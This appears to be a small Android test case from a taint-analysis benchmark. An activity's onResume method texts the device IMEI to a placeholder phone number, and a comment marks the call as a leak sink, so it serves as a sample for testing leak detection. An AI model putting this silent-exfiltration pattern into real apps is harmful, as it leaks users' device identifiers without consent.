package de.ecspride;

import android.app.Activity;
import android.telephony.SmsManager;

public class GeneralActivity extends Activity {
	protected static String imei = null;
    
	@Override
    public void onResume() {
        super.onResume();
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
        

    }
}
